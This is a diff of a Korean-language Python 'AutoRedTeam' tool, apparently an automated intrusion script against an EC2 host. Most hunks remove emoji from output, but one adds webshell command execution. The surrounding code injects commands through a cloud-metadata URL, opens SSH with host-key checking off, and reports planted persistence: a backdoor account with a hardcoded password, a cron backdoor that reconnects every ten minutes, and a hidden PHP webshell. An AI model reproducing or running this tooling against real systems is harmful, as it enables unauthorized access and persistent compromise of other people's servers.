@@ -37,10 +37,10 @@ class AutoRedTeam:
         print(f"{self.YELLOW}[{step}]{self.ENDC} {text}")
 
     def print_success(self, text):
-        print(f"{self.GREEN}[+] ✅ {text}{self.ENDC}")
+        print(f"{self.GREEN}[+]  {text}{self.ENDC}")
 
     def print_error(self, text):
-        print(f"{self.RED}[-] ❌ {text}{self.ENDC}")
+        print(f"{self.RED}[-]  {text}{self.ENDC}")
 
     def print_info(self, text):
         print(f"{self.CYAN}[*] {text}{self.ENDC}")
@@ -48,7 +48,18 @@ class AutoRedTeam:
     def execute_webshell(self, cmd):
         """웹쉘로 명령 실행"""
         try:
-            # check=metadata로 명령 실행 시도
+            # check=custom 시도
+            params = {
+                'check': 'custom',
+                'cmd': cmd
+            }
+            response = self.session.get(self.webshell_url, params=params, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                if 'output' in data:
+                    return data['output']
+
+            # check=metadata로 시도
             params = {
                 'check': 'metadata',
                 'url': f'http://169.254.169.254/latest/;{cmd}'
@@ -260,7 +271,7 @@ if(isset($_GET['c'])){
     def interactive_shell(self):
         """대화형 SSH 쉘"""
         self.print_step(9, "대화형 SSH 쉘 실행...")
-        print(f"\n{self.GREEN}✓ 침투 완료! SSH 쉘을 시작합니다...{self.ENDC}")
+        print(f"\n{self.GREEN} 침투 완료! SSH 쉘을 시작합니다...{self.ENDC}")
         print(f"{self.YELLOW}[!] 'exit'로 종료{self.ENDC}\n")
 
         cmd = f'ssh -i {self.ssh_key_path} -o StrictHostKeyChecking=no ec2-user@{self.target_ip}'
@@ -270,7 +281,7 @@ if(isset($_GET['c'])){
         """전체 자동 침투 실행"""
         print(f"""
 {self.RED}╔{'═'*68}╗{self.ENDC}
-{self.RED}║{self.BOLD}{self.YELLOW}  🔥 레드팀 완전 자동 침투 도구 🔥{self.ENDC}{' '*30}{self.RED}║{self.ENDC}
+{self.RED}║{self.BOLD}{self.YELLOW}   레드팀 완전 자동 침투 도구 {self.ENDC}{' '*30}{self.RED}║{self.ENDC}
 {self.RED}╚{'═'*68}╝{self.ENDC}
         """)
 
@@ -307,15 +318,15 @@ if(isset($_GET['c'])){
             self.install_webshell_backdoor()
 
         # 완료
-        self.print_header("🎯 침투 완료!")
+        self.print_header(" 침투 완료!")
 
-        print(f"{self.GREEN}✓ SSH 백도어:{self.ENDC} ssh -i {self.ssh_key_path} ec2-user@{self.target_ip}")
+        print(f"{self.GREEN} SSH 백도어:{self.ENDC} ssh -i {self.ssh_key_path} ec2-user@{self.target_ip}")
 
         if has_root:
-            print(f"{self.GREEN}✓ Root 권한:{self.ENDC} sudo su")
-            print(f"{self.GREEN}✓ 백도어 계정:{self.ENDC} ssh sysupdate@{self.target_ip} (비밀번호: Sys@Update2024#Secure)")
-            print(f"{self.GREEN}✓ Cron 백도어:{self.ENDC} 10분마다 자동 재연결")
-            print(f"{self.GREEN}✓ 웹쉘 백도어:{self.ENDC} {self.base_url}/.shell.php?c=whoami")
+            print(f"{self.GREEN} Root 권한:{self.ENDC} sudo su")
+            print(f"{self.GREEN} 백도어 계정:{self.ENDC} ssh sysupdate@{self.target_ip} (비밀번호: Sys@Update2024#Secure)")
+            print(f"{self.GREEN} Cron 백도어:{self.ENDC} 10분마다 자동 재연결")
+            print(f"{self.GREEN} 웹쉘 백도어:{self.ENDC} {self.base_url}/.shell.php?c=whoami")
 
         print()
 
